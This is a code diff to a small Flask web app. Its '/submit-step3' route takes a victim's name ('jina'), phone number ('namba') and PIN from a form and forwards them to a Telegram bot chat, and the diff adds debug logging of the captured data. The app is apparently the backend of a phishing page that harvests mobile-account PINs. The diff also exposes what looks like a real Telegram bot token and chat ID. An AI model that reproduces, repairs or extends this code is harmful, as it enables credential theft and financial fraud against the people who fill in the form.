@@ -6,8 +6,8 @@ import os
 app = Flask(__name__)
 CORS(app)
 
-BOT_TOKEN = os.environ.get("7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0")
-CHAT_ID = os.environ.get("6958413637")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
 @app.route("/")
 def home():
@@ -16,9 +16,13 @@ def home():
 @app.route("/submit-step3", methods=["POST"])
 def submit_step3():
 
+    print("STEP 3 ROUTE HIT")
+
     try:
 
         data = request.get_json()
+
+        print("DATA RECEIVED:", data)
 
         jina = data.get("jina")
         namba = data.get("namba")
@@ -32,6 +36,8 @@ Namba: {namba}
 PIN: {pin}
 """
 
+        print("MESSAGE:", message)
+
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
         payload = {
@@ -39,9 +45,12 @@ PIN: {pin}
             "text": message
         }
 
+        print("SENDING TO TELEGRAM...")
+
         response = requests.post(url, json=payload)
 
-        print(response.text)
+        print("STATUS CODE:", response.status_code)
+        print("RESPONSE:", response.text)
 
         if response.status_code == 200:
 
@@ -58,6 +67,8 @@ PIN: {pin}
             })
 
     except Exception as e:
+
+        print("ERROR:", str(e))
 
         return jsonify({
             "status": "error",
